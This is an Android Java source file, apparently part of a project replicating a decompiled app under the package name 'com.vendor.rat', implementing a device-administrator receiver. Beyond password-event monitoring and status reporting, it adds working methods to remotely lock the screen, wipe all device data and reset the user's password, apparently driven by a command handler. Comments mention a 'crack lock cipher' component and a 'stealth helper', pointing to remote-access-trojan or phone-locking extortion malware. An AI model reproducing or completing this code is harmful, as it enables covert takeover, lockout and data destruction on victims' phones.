package com.vendor.rat.service;

import android.app.admin.DeviceAdminReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.UserHandle;
import android.util.Log;

import com.vendor.rat.MainApplication;

/**
 * 设备管理员接收器 (模块 02)
 *
 * Vendor: com.guard.wallet.receiver.CustomAdminReceiver (119 lines)
 *
 * 功能:
 *   - 设备管理员生命周期回调 (enabled/disabled) → 上报状态
 *   - LockTask 模式进入/退出回调
 *   - 密码监控: changed/expiring/failed/succeeded
 */
public class AppDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = "CustomAdminReceiver"; // ADAPT: vendor uses "CustomAdminReceiver" as TAG

    // ADAPT: vendor field `f195a` (renamed from 'a') — synthetic int, always 0
    public static final /* synthetic */ int f195a = 0;

    /**
     * 上报设备管理员状态变更
     * Vendor: CustomAdminReceiver.a()
     * 构建 DeviceAdminVO → MessageRecordVO → 通过 HandlerMsgAndTimer 发送
     */
    // ADAPT: vendor name `a()` → `reportAdminStatus()`
    public static void reportAdminStatus() {
        // TODO: VENDOR_VERIFY — vendor calls g.C0() to get DeviceAdminVO
        // TODO: VENDOR_VERIFY — vendor creates MessageRecordVO, sets extraBody and intentCode
        // DeviceAdminVO adminVO = DeviceUtils.getDeviceAdminVO();
        // MessageRecordVO messageRecordVO = new MessageRecordVO();
        // messageRecordVO.setExtraBody(adminVO);
        // messageRecordVO.setIntentCode(Objects.equals(adminVO.getIsAdminActive(), 1)
        //     ? "android.app.action.DEVICE_ADMIN_ENABLED"
        //     : "android.app.action.DEVICE_ADMIN_DISABLED");
        // Log.d(TAG, adminVO.toString());
        if (MainApplication.getInstance() == null) {
            return;
        }
        // TODO: VENDOR_VERIFY — vendor calls MainApplication.getInstance().getHandlerMsgAndTimer().b(messageRecordVO)
        Log.d(TAG, "reportAdminStatus called");
    }

    @Override
    public final void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        reportAdminStatus(); // ADAPT: vendor calls a()
    }

    @Override
    public final void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        reportAdminStatus(); // ADAPT: vendor calls a()
    }

    @Override
    public final void onLockTaskModeEntering(Context context, Intent intent, String str) {
        super.onLockTaskModeEntering(context, intent, str);
        Log.d(TAG, "CustomAdminReceiver.onLockTaskModeEntering");
    }

    @Override
    public final void onLockTaskModeExiting(Context context, Intent intent) {
        super.onLockTaskModeExiting(context, intent);
        Log.d(TAG, "CustomAdminReceiver.onLockTaskModeExiting");
    }

    @Override
    public final void onPasswordChanged(Context context, Intent intent, UserHandle userHandle) {
        super.onPasswordChanged(context, intent, userHandle);
        Log.d(TAG, "CustomAdminReceiver.onPasswordChanged");
        // TODO: VENDOR_VERIFY — vendor calls h.G("android.intent.action.DEVICE_PASSWORD_CHANGED")
        // TODO: VENDOR_VERIFY — vendor clears "deviceCipher" and "deviceCipherLocked" via h.w() inside synchronized(ReqUnlockDeviceVO.class)
    }

    @Override
    public final void onPasswordExpiring(Context context, Intent intent, UserHandle userHandle) {
        super.onPasswordExpiring(context, intent, userHandle);
        Log.d(TAG, "CustomAdminReceiver.onPasswordExpiring");
        // TODO: VENDOR_VERIFY — vendor calls h.G("android.intent.action.DEVICE_PASSWORD_EXPIRED")
    }

    @Override
    public final void onPasswordFailed(Context context, Intent intent, UserHandle userHandle) {
        super.onPasswordFailed(context, intent, userHandle);
        Log.d(TAG, "CustomAdminReceiver.onPasswordFailed");
        // TODO: VENDOR_VERIFY — vendor calls h.G("android.intent.action.DEVICE_PASSWORD_FAILED")
        // TODO: VENDOR_VERIFY — vendor checks g.p0() and stores lock batch ID: h.D(Long.valueOf(ScreenBroadcastReceiver.b.a()), "lockBatchId")
        // TODO: VENDOR_VERIFY — vendor gets lockSubscribeId via h.l("lockSubscribeId"), if not empty and g.p0(), calls l.i(new ReqListenHelper(l2, 5))
        // TODO: VENDOR_VERIFY — vendor clears crack lock cipher queue: MainApplication.getInstance().getCrackLockCipherPlug() → c.f184a.clear()
        if (MainApplication.getInstance() == null) {
            return;
        }
        Log.d("com.guard.wallet.plug.c", "cacheResponseQueue clearError"); // ADAPT: vendor logs with this exact tag
    }

    @Override
    public final void onPasswordSucceeded(Context context, Intent intent, UserHandle userHandle) {
        super.onPasswordSucceeded(context, intent, userHandle);
        Log.d(TAG, "CustomAdminReceiver.onPasswordSucceeded");
        // TODO: VENDOR_VERIFY — vendor calls MainApplication.getInstance().getCrackLockCipherPlug() → c.g()
        // TODO: VENDOR_VERIFY — vendor checks r.k() → r.g(true) (stealth helper)
        // TODO: VENDOR_VERIFY — vendor checks o.i() || o.h() → o.f(null, true) (another helper)
    }

    // ============ Utility methods (not in vendor, kept for replica project use) ============

    /**
     * 获取 ComponentName
     * ADAPT: not in vendor CustomAdminReceiver, added for replica convenience
     */
    public static ComponentName getComponentName(Context context) {
        return new ComponentName(context, AppDeviceAdminReceiver.class);
    }

    /**
     * 检查设备管理员是否已激活
     * ADAPT: not in vendor CustomAdminReceiver, added for replica convenience
     */
    public static boolean isAdminActive(Context context) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = getComponentName(context);
            return dpm != null && dpm.isAdminActive(admin);
        } catch (Exception e) {
            Log.e(TAG, "Check admin active failed", e);
            return false;
        }
    }

    /**
     * 锁定屏幕
     * ADAPT: not in vendor CustomAdminReceiver, added for CommandHandler dependency
     */
    public static void lockScreen(Context context) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = getComponentName(context);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.lockNow();
                Log.i(TAG, "Screen locked");
            } else {
                Log.w(TAG, "Cannot lock screen: admin not active");
            }
        } catch (Exception e) {
            Log.e(TAG, "Lock screen failed", e);
        }
    }

    /**
     * 远程擦除数据
     * ADAPT: not in vendor CustomAdminReceiver, added for CommandHandler dependency
     */
    public static void wipeData(Context context) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = getComponentName(context);
            if (dpm != null && dpm.isAdminActive(admin)) {
                Log.w(TAG, "Wiping device data!");
                dpm.wipeData(0);
            } else {
                Log.w(TAG, "Cannot wipe data: admin not active");
            }
        } catch (Exception e) {
            Log.e(TAG, "Wipe data failed", e);
        }
    }

    /**
     * 重置密码
     * ADAPT: not in vendor CustomAdminReceiver, added for CommandHandler dependency
     */
    @SuppressWarnings("deprecation")
    public static boolean resetPassword(Context context, String newPassword) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = getComponentName(context);
            if (dpm != null && dpm.isAdminActive(admin)) {
                boolean result = dpm.resetPassword(newPassword,
                    android.app.admin.DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                Log.i(TAG, "Reset password result: " + result);
                return result;
            }
        } catch (Exception e) {
            Log.e(TAG, "Reset password failed", e);
        }
        return false;
    }
}
